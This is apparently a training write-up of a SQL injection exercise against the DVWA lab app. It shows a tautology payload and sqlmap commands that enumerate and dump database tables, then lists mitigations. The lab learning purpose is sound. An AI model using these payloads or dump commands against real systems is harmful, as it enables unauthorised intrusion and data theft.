# SQL Injection — DVWA

> Note: This report documents a practice assessment against DVWA (Damn Vulnerable Web Application) for learning purposes.

---

## TL;DR

* Target: DVWA (local/lab).
* Issue: SQL Injection present on the "SQL Injection" page.
* Result: Database tables enumerated and data extracted using automated tooling (sqlmap).

---

## Environment / scope

* Attacker: Kali Linux (local).
* Target: DVWA (lab instance).
* Tools: `sqlmap`, Burp Suite, browser.

---

## 1) Objective

Test DVWA for SQL Injection vulnerabilities and demonstrate data extraction using automated tools.

---

## 2) Steps performed

1. Open the DVWA web application and navigate to the **SQL Injection** page.
2. Manually test input fields with a simple payload to check for vulnerability, e.g.:

```sql
' OR '1'='1
```

This payload confirmed the input was not properly sanitized and allowed logical bypass.

3. Use `sqlmap` to automate analysis and extract database information. Example command:

```bash
sqlmap -u "http://<DVWA_HOST>/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --dbs
```

4. After enumerating databases, dump relevant tables:

```bash
sqlmap -u "http://<DVWA_HOST>/vulnerabilities/sqli/?id=1&Submit=Submit" --batch -D <database> --tables
sqlmap -u "http://<DVWA_HOST>/vulnerabilities/sqli/?id=1&Submit=Submit" --batch -D <database> -T <table> --dump
```

---

## 3) Results

* `sqlmap` identified injectable parameters and enumerated available databases.
* Database tables were successfully dumped, and sample data was extracted to demonstrate the vulnerability impact.

---

## 4) Conclusion & mitigation

**Root cause:** Lack of parameterized queries and insufficient input validation.
**Mitigations:**

* Use prepared statements / parameterized queries on the server side.
* Enforce strong input validation and output encoding.
* Apply least privilege to database accounts and avoid using highly-privileged accounts for application access.

---

*End of report.*
